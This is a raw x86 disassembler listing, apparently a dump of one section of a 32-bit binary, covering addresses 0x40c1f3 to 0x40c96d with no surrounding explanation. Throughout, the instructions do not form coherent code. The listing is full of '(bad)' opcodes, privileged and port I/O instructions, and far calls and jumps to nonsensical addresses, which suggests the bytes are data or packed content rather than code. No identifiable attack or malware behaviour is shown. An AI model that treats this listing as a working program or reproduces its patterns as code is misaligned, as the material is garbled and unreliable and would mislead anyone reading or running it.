  40c1f3:	js     0x40c252
  40c1f5:	pop    eax
  40c1f6:	lds    esp,FWORD PTR [esi-0x565f0ea0]
  40c1fc:	xchg   ebp,eax
  40c1fd:	adc    BYTE PTR [ebx-0x48],dl
  40c200:	cs ins DWORD PTR es:[edi],dx
  40c202:	mov    BYTE PTR ss:[ecx-0x67],ch
  40c206:	cmp    eax,0x786810ba
  40c20b:	sbb    BYTE PTR [ebp+ebp*8-0x77],dh
  40c20f:	mov    al,ds:0x68d0fa7d
  40c214:	ja     0x40c211
  40c216:	rcl    DWORD PTR [ecx+0x64],1
  40c219:	pusha  
  40c21a:	clc    
  40c21b:	xor    ecx,DWORD PTR [eax+edi*2+0x8cb5fcd]
  40c222:	loop   0x40c1b6
  40c224:	out    dx,al
  40c225:	dec    esi
  40c226:	repz (bad) 
  40c228:	fist   DWORD PTR ds:0x73c3e9ae
  40c22e:	mov    al,ds:0x93d23ced
  40c233:	test   esi,edx
  40c235:	hlt    
  40c236:	sub    BYTE PTR [ebp+0x31c16167],ah
  40c23c:	sbb    DWORD PTR [eax+0x1a],0x829da78b
  40c243:	lds    ebp,FWORD PTR [esi]
  40c245:	pusha  
  40c246:	cmp    al,0xeb
  40c248:	hlt    
  40c249:	addr16 ss mov ds,eax
  40c24d:	popa   
  40c24e:	and    BYTE PTR [eax+esi*8+0x42],cl
  40c252:	push   esi
  40c253:	ficom  WORD PTR ds:0xe8b741ff
  40c259:	or     DWORD PTR [eax-0x34],0xb8dc029d
  40c260:	imul   eax,DWORD PTR [ecx-0x18],0x77
  40c264:	cmp    al,BYTE PTR [eax]
  40c266:	jne    0x40c207
  40c268:	inc    eax
  40c269:	ja     0x40c244
  40c26b:	dec    ebx
  40c26c:	jmp    0xa7574448
  40c271:	sbb    BYTE PTR [ebp+ecx*2+0x68c43000],0x22
  40c279:	push   esp
  40c27a:	jle    0x40c2bb
  40c27c:	pop    ss
  40c27d:	adc    ecx,DWORD PTR [esi+0x67eafcc]
  40c283:	jne    0x40c2f1
  40c285:	test   al,0x16
  40c287:	pop    eax
  40c288:	jno    0x40c20f
  40c28a:	jnp    0x40c21a
  40c28c:	xor    al,BYTE PTR [eax-0x22]
  40c28f:	mov    DWORD PTR [esi-0x4b],edi
  40c292:	call   0x845e:0xe4720eb5
  40c299:	shr    BYTE PTR [edx+0x76],cl
  40c29c:	push   ebx
  40c29d:	retf   
  40c29e:	(bad)  
  40c2a0:	shr    BYTE PTR [edi],1
  40c2a2:	mov    ebx,0xe30d1ece
  40c2a7:	call   DWORD PTR [ebx+0x3f]
  40c2aa:	adc    BYTE PTR [ebp-0x6d74d52],ch
  40c2b0:	out    dx,al
  40c2b1:	js     0x40c24e
  40c2b3:	mov    cl,0x63
  40c2b5:	cs ss mov ebx,0x2741f587
  40c2bc:	cld    
  40c2bd:	int    0x38
  40c2bf:	and    BYTE PTR [eax+esi*4+0xda60dcc],al
  40c2c6:	loop   0x40c2cd
  40c2c8:	pop    esi
  40c2c9:	or     DWORD PTR [eax],edi
  40c2cb:	jns    0x40c257
  40c2cd:	imul   DWORD PTR [eax-0xcae3749]
  40c2d3:	sbb    eax,0x92faa749
  40c2d8:	imul   eax,DWORD PTR [esi+eax*4],0xffffffbe
  40c2dc:	jp     0x40c344
  40c2de:	mov    ecx,ebp
  40c2e0:	xchg   esi,eax
  40c2e1:	mov    eax,0x64cf7d5d
  40c2e6:	dec    edi
  40c2e7:	jae    0x40c312
  40c2e9:	mov    ch,0x57
  40c2eb:	ds in  eax,dx
  40c2ed:	mov    edx,0x9ccd650
  40c2f2:	adc    ebx,DWORD PTR [esi+0x49]
  40c2f5:	inc    esi
  40c2f6:	jae    0x40c331
  40c2f8:	dec    ebx
  40c2f9:	dec    esi
  40c2fa:	int    0xdc
  40c2fc:	lods   eax,DWORD PTR ds:[esi]
  40c2fd:	push   es
  40c2fe:	lods   al,BYTE PTR ds:[esi]
  40c2ff:	and    BYTE PTR [ebp-0x4466559b],0x43
  40c306:	imul   esi,DWORD PTR [ebp-0x50aa7a4c],0xe9d677b6
  40c310:	mov    al,ds:0xcaa726af
  40c315:	iret   
  40c316:	xor    eax,0x41a0fb74
  40c31b:	mov    DWORD PTR [eax],edx
  40c31d:	ffree  st(2)
  40c31f:	jb     0x40c396
  40c321:	push   eax
  40c322:	retf   
  40c323:	cld    
  40c324:	(bad)  
  40c325:	int    0x79
  40c327:	hlt    
  40c328:	sbb    BYTE PTR [ecx+0x26],dl
  40c32b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c32c:	dec    ecx
  40c32d:	jmp    0x40c2b3
  40c32f:	cmp    al,0xcd
  40c331:	mov    WORD PTR [edi-0x5dd249c0],cs
  40c337:	adc    DWORD PTR [edi+0x3fe4ad6c],eax
  40c33d:	mov    ebp,0x9ee1bd03
  40c342:	xlat   BYTE PTR ds:[ebx]
  40c343:	test   al,0x68
  40c345:	les    esp,FWORD PTR [eax+0x6247550e]
  40c34b:	sub    al,dl
  40c34d:	mov    edx,0x1ca28f5c
  40c352:	cs mov al,0xa9
  40c355:	sti    
  40c356:	ret    
  40c357:	iret   
  40c358:	push   edx
  40c359:	dec    eax
  40c35a:	sahf   
  40c35b:	stos   DWORD PTR es:[edi],eax
  40c35c:	mov    dh,0x8
  40c35e:	(bad)  
  40c360:	dec    esp
  40c361:	sub    al,0x86
  40c363:	imul   eax,DWORD PTR [eax],0xffffff9b
  40c366:	out    dx,eax
  40c367:	dec    ecx
  40c368:	xchg   ebp,eax
  40c369:	cwde   
  40c36a:	je     0x40c351
  40c36c:	cdq    
  40c36d:	xchg   ebp,eax
  40c36e:	pop    es
  40c36f:	xchg   edi,eax
  40c370:	sub    DWORD PTR [edx+0xe],esp
  40c373:	retf   
  40c374:	add    ecx,ecx
  40c376:	(bad)  
  40c377:	shl    DWORD PTR [ecx-0x60],0x8f
  40c37b:	shr    DWORD PTR [ebp-0x1650b091],cl
  40c381:	out    dx,eax
  40c382:	or     ebp,eax
  40c384:	xchg   esp,eax
  40c385:	mov    esi,0x10b6f19c
  40c38a:	or     eax,0xfe49795d
  40c38f:	jecxz  0x40c398
  40c391:	arpl   WORD PTR ds:0x54585563,di
  40c397:	call   0x66f6ea01
  40c39c:	int    0x26
  40c39e:	mov    ah,0x2f
  40c3a0:	popf   
  40c3a1:	cmp    eax,0xe7b6b6b9
  40c3a6:	mov    eax,ds:0x1a527ccb
  40c3ab:	add    eax,0xdbe112ea
  40c3b0:	push   edx
  40c3b1:	xchg   edx,eax
  40c3b2:	ds sti 
  40c3b4:	mov    ebx,0xcb6b2d07
  40c3b9:	adc    edx,DWORD PTR [ebp+eiz*4+0x313f975a]
  40c3c0:	(bad)  
  40c3c1:	xlat   BYTE PTR ds:[ebx]
  40c3c2:	stc    
  40c3c3:	sbb    BYTE PTR [ebp-0xa],ah
  40c3c6:	push   ds
  40c3c7:	mov    esp,0x3ce47bf5
  40c3cc:	push   ss
  40c3cd:	jb     0x40c441
  40c3cf:	sbb    DWORD PTR [ebp+eiz*4+0x58],ecx
  40c3d3:	xor    al,0x53
  40c3d5:	jl     0x40c3a0
  40c3d7:	jae    0x40c3e9
  40c3d9:	xchg   edi,ecx
  40c3db:	add    DWORD PTR [ecx-0x62],0xd8dbe61b
  40c3e2:	cld    
  40c3e3:	sbb    edi,DWORD PTR [eax+0x13]
  40c3e6:	(bad)
  40c3eb:	addr16 lock or al,0xcf
  40c3ef:	icebp  
  40c3f0:	mov    ch,0xcb
  40c3f2:	jg     0x40c3a7
  40c3f4:	push   esi
  40c3f5:	jmp    DWORD PTR [ebx+0x3f1f0783]
  40c3fb:	jbe    0x40c389
  40c3fd:	int    0x26
  40c3ff:	push   edx
  40c400:	daa    
  40c401:	or     edx,DWORD PTR [edx-0x71]
  40c404:	xchg   ebx,eax
  40c405:	retf   0xd21d
  40c408:	imul   esi,esp,0xa24a80a1
  40c40e:	out    dx,eax
  40c40f:	ror    DWORD PTR [edx+0x26aec058],0xdb
  40c416:	dec    ebp
  40c417:	not    edx
  40c419:	xchg   edi,eax
  40c41a:	xchg   BYTE PTR [ebx],ah
  40c41c:	test   BYTE PTR [ebp-0x25],0x1e
  40c420:	cmc    
  40c421:	clc    
  40c422:	arpl   WORD PTR [edi],bx
  40c424:	test   eax,0xca0e5ea
  40c429:	leave  
  40c42a:	mov    al,ds:0x129204a4
  40c42f:	or     al,0xfe
  40c431:	mov    BYTE PTR [eax],ch
  40c433:	(bad)  
  40c434:	and    esi,DWORD PTR [edx-0x72]
  40c437:	cmp    BYTE PTR [esp+eax*2],0x7f
  40c43b:	aad    0xd0
  40c43d:	jmp    0x40c408
  40c43f:	xlat   BYTE PTR ds:[ebx]
  40c440:	neg    ecx
  40c442:	mov    fs,WORD PTR [edi-0x43725b3e]
  40c448:	inc    ecx
  40c449:	xchg   ebx,eax
  40c44a:	adc    BYTE PTR [ecx-0x69],bl
  40c44d:	push   0x42df2476
  40c452:	sub    BYTE PTR [ebx+0x70],0x33
  40c456:	mov    BYTE PTR [esi+ebp*2+0x33],ah
  40c45a:	cmp    BYTE PTR [edi-0x25],0x36
  40c45e:	pop    ds
  40c45f:	mov    cl,0x61
  40c461:	sar    DWORD PTR [edi+0x2c],cl
  40c464:	test   eax,0x54407276
  40c469:	inc    esi
  40c46a:	outs   dx,DWORD PTR ds:[esi]
  40c46b:	mov    ch,0xd2
  40c46d:	arpl   WORD PTR [esp+eiz*2],dx
  40c470:	mov    ecx,0xe4aaf816
  40c475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c476:	mov    edi,0xc0260d87
  40c47b:	rol    DWORD PTR [esi+esi*1-0xf4482d4],0x10
  40c483:	cmp    eax,0x568f3cd6
  40c488:	inc    ecx
  40c489:	jge    0x40c4ff
  40c48b:	shl    BYTE PTR [ebx],cl
  40c48d:	xchg   edx,eax
  40c48e:	and    esi,edi
  40c490:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c491:	mov    ss,edx
  40c493:	push   edx
  40c494:	les    esi,FWORD PTR [ecx+eax*1+0x26e43009]
  40c49b:	or     BYTE PTR [edi-0x62],dl
  40c49e:	sbb    eax,0x17223cf
  40c4a3:	dec    ecx
  40c4a4:	div    BYTE PTR [ebx+0x5d]
  40c4a7:	mov    ebx,DWORD PTR [ecx+0x6f]
  40c4aa:	jo     0x40c4a0
  40c4ac:	aad    0x6a
  40c4ae:	mov    cl,0x74
  40c4b0:	jl     0x40c51b
  40c4b2:	test   DWORD PTR [esi-0x35],esi
  40c4b5:	inc    esp
  40c4b6:	(bad)  
  40c4b7:	adc    ch,BYTE PTR [ecx+0x426c323e]
  40c4bd:	lods   eax,DWORD PTR ds:[esi]
  40c4be:	fidivr WORD PTR [ebx-0x3f]
  40c4c1:	inc    eax
  40c4c2:	sahf   
  40c4c3:	ins    BYTE PTR es:[edi],dx
  40c4c4:	out    dx,eax
  40c4c5:	dec    eax
  40c4c6:	adc    DWORD PTR [eax-0x53],esp
  40c4c9:	sbb    al,0xe6
  40c4cb:	push   es
  40c4cc:	shl    BYTE PTR [esi],cl
  40c4ce:	retf   0x3d6c
  40c4d1:	mov    bl,0xa3
  40c4d3:	(bad)  
  40c4d4:	ffreep st(1)
  40c4d6:	rcr    esp,1
  40c4d8:	cli    
  40c4d9:	test   eax,0x149dc48c
  40c4de:	pause  
  40c4e0:	inc    esp
  40c4e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4e2:	sbb    edx,esp
  40c4e4:	xchg   esp,eax
  40c4e5:	inc    edx
  40c4e6:	retf   
  40c4e7:	test   BYTE PTR [eax+0x61],cl
  40c4ea:	(bad)  
  40c4eb:	call   0xa45d5164
  40c4f0:	cdq    
  40c4f1:	clc    
  40c4f2:	adc    BYTE PTR [ebx+ebp*2-0x27a468f0],bh
  40c4f9:	push   edi
  40c4fa:	out    dx,eax
  40c4fb:	mov    WORD PTR ds:0x68612a7c,es
  40c501:	pop    ebx
  40c502:	lock or BYTE PTR [edi+0x35],bl
  40c506:	mov    al,ds:0x37ded1e2
  40c50b:	pop    edx
  40c50c:	inc    ebp
  40c50d:	mov    al,0xfb
  40c510:	les    ebp,FWORD PTR [eax+0x5c]
  40c513:	shl    DWORD PTR [eax+0x5c4706b1],cl
  40c519:	(bad)
  40c51c:	mov    WORD PTR [ecx+0x60],fs
  40c51f:	dec    edi
  40c520:	and    al,BYTE PTR [esi+0x3bf9ca1e]
  40c526:	iret   
  40c527:	or     edx,DWORD PTR [esi+0x7a]
  40c52a:	and    DWORD PTR [edx+edx*2-0x15],ecx
  40c52e:	in     eax,0x87
  40c530:	leave  
  40c531:	dec    ecx
  40c532:	push   cs
  40c533:	dec    edi
  40c534:	sti    
  40c535:	js     0x40c4d4
  40c537:	(bad)  
  40c538:	int    0x25
  40c53a:	or     eax,0xb9a523f5
  40c53f:	inc    edi
  40c540:	or     esi,DWORD PTR [ebx+0x233593ed]
  40c546:	jmp    0x40c5bf
  40c548:	xor    bl,ch
  40c54a:	pop    edi
  40c54b:	sub    al,0xa8
  40c54d:	std    
  40c54e:	mov    esp,DWORD PTR [edx+0x5dfab44e]
  40c554:	fiadd  WORD PTR [edi+0x67adae2d]
  40c55a:	sti    
  40c55b:	push   0x20
  40c55d:	je     0x40c4ef
  40c55f:	push   ebp
  40c560:	push   ecx
  40c561:	xchg   ebp,eax
  40c562:	hlt    
  40c563:	jb     0x40c551
  40c565:	icebp  
  40c566:	loopne 0x40c56a
  40c568:	and    dl,BYTE PTR [ebp+0x54ad5a2]
  40c56e:	push   edi
  40c56f:	push   es
  40c570:	push   ds
  40c571:	das    
  40c572:	jmp    0x40c526
  40c574:	ret    0x35cd
  40c577:	sub    eax,0x4b242b28
  40c57c:	das    
  40c57d:	add    eax,0xeb22f536
  40c582:	call   0xc5fb:0xb2b54cc7
  40c589:	in     al,0xba
  40c58b:	and    al,0x5d
  40c58d:	xchg   BYTE PTR [ebx-0x2c],cl
  40c590:	enter  0xb68e,0x92
  40c594:	and    esi,DWORD PTR [eax-0x5a]
  40c597:	sub    al,0x10
  40c599:	lahf   
  40c59a:	xor    eax,0x67176050
  40c59f:	and    eax,0x88e92d00
  40c5a4:	outs   dx,BYTE PTR ds:[esi]
  40c5a5:	cdq    
  40c5a6:	sti    
  40c5a7:	mov    ah,0x1f
  40c5a9:	adc    ecx,ecx
  40c5ab:	nop
  40c5ac:	jnp    0x40c54a
  40c5ae:	cmp    BYTE PTR [edx],bl
  40c5b0:	iret   
  40c5b1:	les    eax,FWORD PTR [eax]
  40c5b3:	dec    edx
  40c5b4:	xchg   BYTE PTR [eax],ch
  40c5b6:	ss mov cl,0x90
  40c5b9:	jmp    0x9bb36ad7
  40c5be:	xchg   esp,eax
  40c5bf:	xlat   BYTE PTR ds:[ebx]
  40c5c0:	dec    edx
  40c5c1:	mov    eax,ds:0x8b8d6868
  40c5c6:	pop    ebp
  40c5c7:	repnz cs in al,0xc4
  40c5cb:	popa   
  40c5cc:	mov    al,ds:0x23381d32
  40c5d1:	adc    esp,eax
  40c5d3:	stos   DWORD PTR es:[edi],eax
  40c5d4:	loopne 0x40c5cf
  40c5d6:	stos   DWORD PTR es:[edi],eax
  40c5d7:	push   ebx
  40c5d8:	mov    esi,0x5db2a376
  40c5dd:	sbb    al,0x83
  40c5df:	loope  0x40c62b
  40c5e1:	cmp    cl,BYTE PTR [ebx-0x65]
  40c5e4:	ret    0x122a
  40c5e7:	jl     0x40c604
  40c5e9:	xlat   BYTE PTR ds:[ebx]
  40c5ea:	add    al,0x5
  40c5ec:	mov    ah,0xe7
  40c5ee:	mov    ebx,0xb428f346
  40c5f3:	aaa    
  40c5f4:	jmp    0x40c5c2
  40c5f6:	scas   al,BYTE PTR es:[edi]
  40c5f7:	stc    
  40c5f8:	btr    DWORD PTR [esi],edx
  40c5fb:	scas   al,BYTE PTR es:[edi]
  40c5fc:	pop    ebx
  40c5fd:	xlat   BYTE PTR ds:[ebx]
  40c5fe:	jne    0x40c58a
  40c600:	or     bl,ah
  40c602:	ret    0x39c1
  40c605:	pop    ds
  40c606:	loope  0x40c5bd
  40c608:	aad    0xb6
  40c60a:	jmp    DWORD PTR [edi]
  40c60c:	jmp    0xe750a172
  40c611:	and    esp,DWORD PTR [eax-0xe]
  40c614:	popf   
  40c615:	daa    
  40c616:	sub    al,0x51
  40c618:	mov    DWORD PTR [edi+0x20],ebp
  40c61b:	mov    edx,0x163a2abc
  40c620:	call   0xed64:0xdea1c23
  40c627:	dec    edx
  40c628:	sub    DWORD PTR [edx-0x66],eax
  40c62b:	xlat   BYTE PTR ds:[ebx]
  40c62c:	shl    DWORD PTR [ecx+0x38053d66],cl
  40c632:	rcl    ebp,0xe
  40c635:	aas    
  40c636:	fisttp WORD PTR [edx]
  40c638:	and    BYTE PTR [esi+0x1f6b29e],0x38
  40c63f:	push   esi
  40c640:	fnstenv [ecx-0x14]
  40c643:	sbb    eax,0x46b501bc
  40c648:	inc    ebp
  40c649:	sbb    DWORD PTR [edx+0x5b2982d0],eax
  40c64f:	sbb    BYTE PTR [esi],ch
  40c651:	mov    ah,0x76
  40c653:	jmp    0xbb01:0x6b1438ab
  40c65a:	pop    es
  40c65b:	jno    0x40c61b
  40c65d:	imul   esi,DWORD PTR [eax-0x41827fe3],0x23
  40c664:	add    dl,al
  40c666:	test   eax,0xdb95f75e
  40c66b:	xor    eax,0x1b82439e
  40c670:	mov    ch,0x60
  40c672:	sbb    eax,0x599b8f7b
  40c677:	out    0xc4,al
  40c679:	mov    ebx,0x8591bfda
  40c67e:	scas   al,BYTE PTR es:[edi]
  40c67f:	pop    edx
  40c680:	lods   eax,DWORD PTR ds:[esi]
  40c681:	clc    
  40c682:	ret    
  40c683:	xor    al,0xa2
  40c685:	pop    esi
  40c686:	rcl    DWORD PTR [ebx+0x5aa156c2],cl
  40c68c:	(bad)  
  40c68d:	lock popa 
  40c68f:	mov    bh,BYTE PTR [edx+edx*8]
  40c692:	jns    0x40c622
  40c694:	and    eax,0x967b8c59
  40c699:	fucomi st,st(1)
  40c69b:	mov    ch,0xee
  40c69d:	sub    ebx,DWORD PTR [edx]
  40c69f:	loop   0x40c69b
  40c6a1:	xor    BYTE PTR [edi+esi*1-0x40],dh
  40c6a5:	and    esp,DWORD PTR [ebx]
  40c6a7:	aas    
  40c6a8:	and    DWORD PTR [eax],ecx
  40c6aa:	sub    DWORD PTR [ebx+eax*8+0x33acecea],ecx
  40c6b1:	xchg   ebp,eax
  40c6b2:	fwait
  40c6b3:	xchg   ebx,eax
  40c6b4:	clc    
  40c6b5:	(bad)  
  40c6b6:	cmp    ecx,DWORD PTR [ecx-0x581ca91c]
  40c6bc:	(bad)  
  40c6be:	and    cl,BYTE PTR [ecx]
  40c6c0:	leave  
  40c6c1:	leave  
  40c6c2:	mov    bl,BYTE PTR fs:[edx+0x6b]
  40c6c6:	push   esi
  40c6c7:	out    dx,al
  40c6c8:	(bad)  
  40c6c9:	fstp   TBYTE PTR [edx+edx*4-0x6b]
  40c6cd:	push   cs
  40c6ce:	bound  esi,QWORD PTR [esi-0x7f]
  40c6d1:	push   cs
  40c6d2:	ins    DWORD PTR es:[edi],dx
  40c6d3:	and    eax,0x1acbdaba
  40c6d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6d9:	xchg   esp,eax
  40c6da:	aas    
  40c6db:	sbb    BYTE PTR [esi-0x95b27dc],ch
  40c6e1:	sbb    dl,ah
  40c6e3:	push   edi
  40c6e4:	pop    ebp
  40c6e5:	and    eax,0xefccc572
  40c6ea:	xchg   edx,eax
  40c6eb:	push   0xfffffff9
  40c6ed:	cli    
  40c6ee:	jp     0x40c692
  40c6f0:	jb     0x40c734
  40c6f2:	stos   BYTE PTR es:[edi],al
  40c6f3:	fwait
  40c6f4:	pop    ebx
  40c6f5:	or     BYTE PTR [edi+0x9],ch
  40c6f8:	push   eax
  40c6f9:	sub    ebx,DWORD PTR [edi]
  40c6fb:	mov    ecx,0xf8b44c9b
  40c700:	add    eax,0xe48348a
  40c705:	scas   eax,DWORD PTR es:[edi]
  40c706:	fmul   DWORD PTR [esi]
  40c708:	mov    WORD PTR [ebx+0x1cb80eab],fs
  40c70e:	dec    esp
  40c70f:	push   es
  40c710:	xchg   ecx,eax
  40c711:	ficom  WORD PTR [edx+0x6d]
  40c714:	sbb    bl,BYTE PTR [ebx-0x51]
  40c717:	mov    al,ds:0xc7d09cb1
  40c71c:	xor    ah,BYTE PTR ds:0xc87d53e8
  40c722:	lea    ebx,[ecx-0x257e4dfa]
  40c728:	xchg   edi,eax
  40c729:	cwde   
  40c72a:	xor    al,0x4d
  40c72c:	sub    cl,BYTE PTR cs:[ebx+0x74]
  40c730:	mov    dh,0x9
  40c732:	dec    esi
  40c733:	mov    edi,0x15e635ce
  40c738:	outs   dx,DWORD PTR ds:[esi]
  40c739:	xchg   ecx,eax
  40c73a:	xchg   ecx,eax
  40c73b:	cmc    
  40c73c:	or     eax,0xd448cb91
  40c741:	mov    cl,0x3f
  40c743:	sahf   
  40c744:	or     eax,0x1d426917
  40c749:	sets   BYTE PTR [eax+0x39]
  40c74d:	call   0xff9c:0xfc72d422
  40c754:	dec    ecx
  40c755:	inc    edi
  40c756:	inc    ebp
  40c757:	xchg   edx,eax
  40c758:	cdq    
  40c759:	pusha  
  40c75a:	in     al,0xf1
  40c75c:	int    0x6f
  40c75e:	and    al,0xc5
  40c760:	cmp    al,0x9
  40c762:	fild   DWORD PTR [ecx-0x335fe041]
  40c768:	lahf   
  40c769:	jl     0x40c772
  40c76b:	xchg   edx,eax
  40c76c:	or     DWORD PTR [eax+0x43],edi
  40c76f:	dec    esp
  40c770:	fiadd  WORD PTR [esi]
  40c772:	adc    ah,BYTE PTR [edx]
  40c774:	psubsw mm7,QWORD PTR [eax+0x2756ff7]
  40c77b:	xlat   BYTE PTR ds:[ebx]
  40c77c:	pop    esi
  40c77d:	xchg   BYTE PTR [ecx-0x4c51f79],ch
  40c783:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c784:	imul   eax,DWORD PTR [esi],0xdf8a3082
  40c78a:	or     edi,DWORD PTR [edi]
  40c78c:	mov    al,ds:0xd39c4d56
  40c791:	dec    ebp
  40c792:	stos   DWORD PTR es:[edi],eax
  40c793:	pop    edx
  40c794:	xor    ebp,edi
  40c796:	pop    es
  40c797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c798:	lods   al,BYTE PTR ds:[esi]
  40c799:	xchg   edx,eax
  40c79a:	xor    DWORD PTR [ebx+0x5f],eax
  40c79d:	adc    cl,BYTE PTR [edi]
  40c79f:	cmp    bl,BYTE PTR [edx]
  40c7a1:	bound  ebx,QWORD PTR [edi-0x50]
  40c7a4:	outs   dx,BYTE PTR ds:[esi]
  40c7a5:	mov    edx,ecx
  40c7a7:	out    dx,eax
  40c7a8:	je     0x40c78c
  40c7aa:	mov    eax,esi
  40c7ac:	or     eax,0xbebbe157
  40c7b1:	sbb    cl,BYTE PTR [ebp+eax*2-0xf]
  40c7b5:	retf   0x3796
  40c7b8:	test   al,0xb7
  40c7ba:	lods   eax,DWORD PTR ds:[esi]
  40c7bb:	(bad)  
  40c7bc:	ins    BYTE PTR es:[edi],dx
  40c7bd:	xchg   DWORD PTR [eax+0x4f8f897a],eax
  40c7c3:	fs pushf 
  40c7c5:	das    
  40c7c6:	std    
  40c7c7:	sub    bh,BYTE PTR [eax+ecx*8-0x21]
  40c7cb:	mov    ebx,0x1d0e4bf3
  40c7d0:	add    DWORD PTR [edx],edx
  40c7d2:	daa    
  40c7d3:	mov    eax,0xcffae8da
  40c7d8:	sbb    DWORD PTR [esi+eiz*2-0xf],ebx
  40c7dc:	fnstsw WORD PTR [eax+0x36]
  40c7df:	sahf   
  40c7e0:	and    dl,bh
  40c7e2:	lds    esi,FWORD PTR [ecx]
  40c7e4:	clc    
  40c7e5:	out    dx,eax
  40c7e6:	dec    esp
  40c7e7:	inc    esi
  40c7e8:	pop    esp
  40c7e9:	sbb    dh,BYTE PTR [esi]
  40c7eb:	pop    esi
  40c7ec:	dec    edi
  40c7ed:	std    
  40c7ee:	mov    eax,DWORD PTR [edx-0x33ed4bd1]
  40c7f4:	addr16 fdivr st,st(4)
  40c7f7:	jl     0x40c7e1
  40c7f9:	test   DWORD PTR [eax+edi*1+0x179bfec],0xe732b9c1
  40c804:	sbb    al,BYTE PTR [ebx+0x27944a4f]
  40c80a:	addr16 xor eax,0xe7ca1d88
  40c810:	mov    al,ds:0xf70688f3
  40c815:	inc    BYTE PTR [ecx+eiz*4-0x30]
  40c819:	add    al,0xce
  40c81b:	add    BYTE PTR [eax],bl
  40c81d:	jge    0x40c810
  40c81f:	sub    BYTE PTR [edi-0x419743e2],bl
  40c825:	popa   
  40c826:	cmp    al,BYTE PTR [ebp-0x3b]
  40c829:	ret    
  40c82a:	cmp    BYTE PTR [ecx+0x28],ch
  40c82d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c82e:	cmp    al,BYTE PTR [ecx+ebx*8+0x18]
  40c832:	xchg   esp,eax
  40c833:	repnz mov edi,0x31ae091f
  40c839:	in     eax,0xab
  40c83b:	pusha  
  40c83c:	ja     0x40c7ff
  40c83e:	add    eax,0xe1565c56
  40c843:	shl    DWORD PTR [ebx+eax*2+0x28],1
  40c847:	mov    ds:0x96a8108d,al
  40c84c:	mov    WORD PTR [edi+ecx*2],ss
  40c84f:	test   eax,0x35b0aeff
  40c854:	jno    0x40c893
  40c856:	nop
  40c857:	(bad)  
  40c858:	and    al,0x7
  40c85a:	sub    ah,BYTE PTR [ebx]
  40c85c:	mov    WORD PTR [edi-0x30f64dbc],fs
  40c862:	pop    esi
  40c863:	mov    bh,0xcb
  40c865:	mov    al,ds:0x103f8bfb
  40c86a:	(bad)
  40c86d:	push   edi
  40c86e:	dec    esi
  40c86f:	xor    dh,bl
  40c871:	mov    ds:0x31a09856,al
  40c876:	lods   eax,DWORD PTR ds:[esi]
  40c877:	(bad)  
  40c878:	or     BYTE PTR [ebp+0x36d4210],dh
  40c87e:	adc    al,0x3c
  40c880:	jl     0x40c8a6
  40c882:	mov    bh,0xa
  40c884:	jnp    0x40c80f
  40c886:	int    0x91
  40c888:	xor    eax,ebp
  40c88a:	dec    ebx
  40c88b:	div    DWORD PTR [edi-0x18159852]
  40c891:	dec    eax
  40c892:	loop   0x40c843
  40c894:	mov    eax,0x995b6d11
  40c899:	add    BYTE PTR [ecx-0x17911164],dh
  40c89f:	sbb    eax,0x64d92d88
  40c8a4:	mov    dh,0xed
  40c8a6:	push   ss
  40c8a7:	mov    eax,0x3ed37053
  40c8ac:	addr16 xor al,0x94
  40c8af:	adc    DWORD PTR [ebp+0x21],edi
  40c8b2:	xor    al,0x97
  40c8b4:	jnp    0x40c899
  40c8b6:	aas    
  40c8b7:	xor    eax,DWORD PTR [edx-0x4d]
  40c8ba:	add    BYTE PTR [esi+0x6f],dl
  40c8bd:	sbb    al,dl
  40c8bf:	mov    eax,DWORD PTR [edx+ecx*2+0x6b]
  40c8c3:	lds    edx,FWORD PTR [esi+0x67]
  40c8c6:	shl    ebp,1
  40c8c8:	mov    bl,al
  40c8ca:	mov    al,ds:0x57fd9f7b
  40c8cf:	or     ebp,edx
  40c8d1:	jbe    0x40c870
  40c8d3:	in     eax,0x67
  40c8d5:	inc    esi
  40c8d6:	push   ebx
  40c8d7:	sub    DWORD PTR [ecx+0x78d36bdf],edx
  40c8dd:	test   BYTE PTR [ebp+0x40],bl
  40c8e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8e1:	pop    sp
  40c8e3:	jno    0x40c91b
  40c8e5:	xchg   esi,eax
  40c8e6:	addr16 out 0x7e,al
  40c8e9:	jge    0x40c917
  40c8eb:	mov    esp,0x31e52626
  40c8f0:	jns    0x40c890
  40c8f2:	jae    0x40c8e9
  40c8f4:	inc    eax
  40c8f5:	inc    ecx
  40c8f6:	jmp    0x3dde3ac9
  40c8fb:	enter  0x4b47,0xad
  40c8ff:	ror    BYTE PTR ds:0x426e4927,1
  40c905:	mov    ebx,0x45602a0e
  40c90a:	jno    0x40c964
  40c90c:	stos   DWORD PTR es:[edi],eax
  40c90d:	push   edi
  40c90e:	popa   
  40c90f:	std    
  40c910:	xchg   edx,eax
  40c911:	mov    eax,0x43fa9ff6
  40c916:	push   es
  40c917:	xor    edx,ebp
  40c919:	icebp  
  40c91a:	popa   
  40c91b:	div    DWORD PTR [edi+edx*4-0x33]
  40c91f:	jnp    0x40c8dc
  40c921:	mov    bl,0x79
  40c923:	fld    DWORD PTR [ecx+ebx*2+0x2a6a128b]
  40c92a:	gs clc 
  40c92c:	sub    al,0x8e
  40c92e:	mov    esi,0x51868795
  40c933:	retf   
  40c934:	ret    0xf80d
  40c937:	in     al,0x19
  40c939:	xchg   DWORD PTR [eax],ebx
  40c93b:	icebp  
  40c93c:	addr16 inc esi
  40c93e:	sub    dh,BYTE PTR [ebp-0x35]
  40c941:	jmp    0x1419:0x87e80273
  40c948:	xchg   esp,eax
  40c949:	adc    bh,BYTE PTR [ecx+0x6a55ef55]
  40c94f:	outs   dx,DWORD PTR ds:[esi]
  40c950:	sub    DWORD PTR [edx],esi
  40c952:	dec    bl
  40c954:	adc    dl,0x8f
  40c957:	cmp    BYTE PTR [ecx+0xe],dl
  40c95a:	inc    eax
  40c95b:	jbe    0x40c95f
  40c95d:	test   al,0x2f
  40c95f:	inc    ebp
  40c960:	adc    eax,0xee10ba52
  40c965:	inc    esi
  40c966:	or     al,BYTE PTR [eax+0xb]
  40c969:	jecxz  0x40c972
  40c96b:	mov    bl,0x38
  40c96d:	xor    eax,0x5684365d
